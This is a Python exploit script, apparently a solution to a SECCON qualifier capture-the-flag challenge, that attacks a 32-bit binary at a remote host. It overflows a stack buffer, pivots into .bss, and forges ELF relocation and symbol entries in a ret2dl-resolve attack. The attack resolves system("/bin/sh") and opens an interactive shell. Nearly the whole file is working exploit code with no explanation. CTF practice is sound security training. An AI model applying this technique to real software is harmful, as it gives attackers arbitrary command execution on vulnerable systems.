from ptrlib import *
    
elf = ELF("./chall")
#libc = ELF("./libc.so.6")
#sock = Process("./chall")
sock = Socket('hiyoko.quals.seccon.jp', 9001)

#logger.setLevel(50)

gets_plt = elf.plt("gets")
gets_got = elf.got("gets")
bss_addr = 0x804c01c
resolver = 0x8049030
base_stage = 0x804cf00 # controllable area (.bss)
#base_stage = 0x804d160 # controllable area (.bss)
#base_stage = 0x804d1e8 # controllable area (.bss)
#base_stage = 0x804d1e8+0x4 # controllable area (.bss)
leave_ret = 0x80490e5 #: leave  ; ret  ;  (1 found)

#AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAl*AAQA*AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
#0x00000006 (SYMTAB)                     0x804820c
#0x00000005 (STRTAB)                     0x804825c
#0x00000017 (JMPREL)                     0x80482d8
SYMTAB = 0x804820c
STRTAB = 0x804825c
JMPREL = 0x80482d8

#buf = bytes('A'*136, 'utf-8')
buf = bytes('A'*132, 'utf-8')
buf += p32(base_stage)
buf += p32(gets_plt)
buf += p32(leave_ret)
buf += p32(base_stage)

sock.sendline(buf)

forged_area = base_stage + 0x14
rel_offset = forged_area - JMPREL
elf32_sym = forged_area + 0x8

align = 0x10 - ((elf32_sym - SYMTAB) % 0x10)

elf32_sym = elf32_sym + align
index_sym = (elf32_sym - SYMTAB) / 0x10
#print(index_sym)
r_info = (int(index_sym) << 8) | 0x7

elf32_rel = p32(gets_got) + p32(r_info)
st_name = (elf32_sym + 0x10) - STRTAB
elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)

buf2 = bytes('AAAA', 'utf-8')
buf2 += p32(resolver)
buf2 += p32(rel_offset)
buf2 += bytes('AAAA', 'utf-8')
buf2 += p32(base_stage+100)
buf2 += elf32_rel
buf2 += bytes('A' * align, 'utf-8')
buf2 += elf32_sym_struct
buf2 += bytes("system\x00", 'utf-8')
p = (100 - len(buf2))
buf2 += bytes('A' * p, 'utf-8')
buf2 += bytes("/bin/sh\x00", 'utf-8')
p = (0x80 - len(buf2))
buf2 += bytes('A' * p, 'utf-8')

#sock.sendline(buf + buf2)
sock.sendline(buf2)

#print(sock.recvline())
sock.interactive()
